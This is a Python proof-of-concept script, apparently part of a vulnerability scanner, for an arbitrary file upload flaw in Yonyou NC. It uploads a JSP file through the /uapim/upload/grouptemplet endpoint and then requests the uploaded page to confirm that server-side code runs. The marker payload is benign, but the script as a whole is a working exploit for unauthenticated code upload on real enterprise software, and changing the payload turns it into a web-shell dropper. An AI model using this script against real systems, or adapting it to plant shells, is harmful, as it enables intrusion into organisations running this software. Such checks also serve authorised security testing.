import requests
import re, time
import urllib, random, string

def verify(url):
    relsult = {
        'name': '用友-NC 任意文件上传(2022HVV)',
        'vulnerable': False,
        'url': url,
    }
    randstr1 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    randstr2 = ''.join(random.sample(string.digits + string.ascii_letters, 4))
    shell = f'<% out.println("{randstr1}" + "{randstr2}"); %>'
    payload = '/uapim/upload/grouptemplet?groupid=3&fileType=jsp'
    timeout = 5
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary7xAs1xFvk4lUjuhF',
    }
    vurl = urllib.parse.urljoin(url, payload)
    data = '------WebKitFormBoundary7xAs1xFvk4lUjuhF\r\nContent-Disposition: form-data; name="upload"; filename="abc.jsp"\r\nContent-Type: application/octet-stream\r\n\r\n{0}\r\n\r\n------WebKitFormBoundary7xAs1xFvk4lUjuhF--'.format(shell)
    verify_url = urllib.parse.urljoin(url, '/uapim/static/pages/3/head.jsp')
    try:
        rep = requests.post(vurl, headers=headers, timeout=timeout, data=data, verify=False)
        if rep.status_code == 200 and 'Invalid' in rep.headers['error']:
            rep2 = requests.get(verify_url, timeout=timeout, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}, verify=False)
            if rep2.status_code == 200 and re.search(randstr1 + randstr2, rep2.text):
                relsult['vulnerable'] = True
                relsult['verify'] = verify_url
        return relsult
    except:
        return relsult

